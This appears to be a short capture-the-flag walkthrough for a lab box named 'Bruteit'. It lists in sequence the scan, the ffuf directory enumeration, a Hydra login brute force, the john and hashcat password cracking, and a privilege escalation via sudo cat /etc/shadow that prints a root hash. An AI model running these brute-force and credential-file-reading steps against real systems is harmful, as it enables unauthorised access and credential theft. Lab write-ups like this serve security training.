# Bruteit
```
EXPORT_IP = 10.10.192.48
```

#### SCAN
```
22 ssh
80 http
```

#### Web Enum
```
TOOL :  ffuf

[DIR Brute Forcing] : /admin
```

#### Login Brute Forcing
```
WORD_LIST = /usr/share/wordlists/rockyou.txt

[Hydra Brute Forcing]
hydra -l admin -P {WORD_LIST} {EXPORT_IP} http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:invalid"

> admin : xavier
```

#### SSH Brute Forcing
```
$ /usr/share/john/ssh2john.py sshEnum/ssh.pub > hash

$ john hash --wordlist=rockyou.txt hash

> rockinroll
```

## PRIVILEGE ESCALATE
```
$ sudo -l

$ sudo /bin/cat /etc/shadow
> root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::

$ hashcat -m 1800 hash {PASSWORD_LIST}
> football

$ su (root:football)
```